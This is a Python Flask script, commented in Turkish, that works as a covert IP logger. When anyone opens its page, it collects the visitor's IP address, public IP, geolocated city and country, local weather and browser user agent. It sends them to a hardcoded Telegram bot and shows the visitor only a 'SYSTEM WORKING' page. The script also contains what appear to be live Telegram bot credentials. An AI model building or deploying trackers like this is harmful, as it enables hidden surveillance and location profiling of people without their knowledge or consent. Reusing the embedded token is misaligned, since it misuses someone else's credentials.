from flask import Flask, request
import requests
import time
import os

app = Flask(__name__)

TELEGRAM_TOKEN = "9021080798:AAEXhjdd0iAX1cvMFrk0MXfSj2PvnXvkSV8"
CHAT_ID = "7622505128"

son_mesaj_zamani = 0

def telegram_mesaj_gonder(mesaj):
    global son_mesaj_zamani
    simdi = time.time()
    if simdi - son_mesaj_zamani < 10: return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": CHAT_ID, "text": mesaj, "parse_mode": "HTML"})
        son_mesaj_zamani = simdi
    except Exception as e:
        print("Telegram Hatası:", e)

@app.route('/', methods=['GET'])
def ana_sayfa():
    if request.path == '/favicon.ico': return "OK", 200
    
    forwarded_for = request.headers.get('X-Forwarded-For')
    if forwarded_for:
        ziyaretci_ip = forwarded_for.split(',')[0].strip()
    else:
        ziyaretci_ip = request.remote_addr
    
    user_agent = request.headers.get('User-Agent')
    sehir = "Bilinmiyor"
    ulke = "Bilinmiyor"
    hava = "Alınamadı"
    sorgulanan_ip = ziyaretci_ip
    
    # 🚨 EĞER IP YEREL AĞ (192.168...) İSE, EVİN GENEL IP'SİNİ AL
    if ziyaretci_ip.startswith("192.168.") or ziyaretci_ip.startswith("10.") or ziyaretci_ip.startswith("127."):
        try:
            # Evin dış IP'sini bul
            sorgulanan_ip = requests.get('https://api.ipify.org').text
        except:
            pass

    try:
        # Konumu sorgula
        konum_verisi = requests.get(f'http://ip-api.com/json/{sorgulanan_ip}', timeout=5).json()
        if konum_verisi.get('status') == 'success':
            sehir = konum_verisi.get('city', 'Bilinmiyor')
            ulke = konum_verisi.get('country', 'Bilinmiyor')
            hava = requests.get(f'https://wttr.in/{sehir}?format=3').text.strip()
    except Exception as e:
        pass

    mesaj = f"""🚨 <b>SİTEYE BİRİ GİRDİ!</b>
🌐 <b>Yerel IP:</b> {ziyaretci_ip}
🌍 <b>Genel IP:</b> {sorgulanan_ip}
📍 <b>Konum:</b> {sehir}, {ulke}
☀️ <b>Hava:</b> {hava}
📱 <b>Tarayıcı:</b> {user_agent}"""

    telegram_mesaj_gonder(mesaj)
    
    return """
    <body style='background:#111; color:#0f0; text-align:center; padding-top:20%;'>
        <h1>SİSTEM ÇALIŞIYOR</h1>
        <p>Akıllı IP kontrolü aktif!</p>
    </body>
    """

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
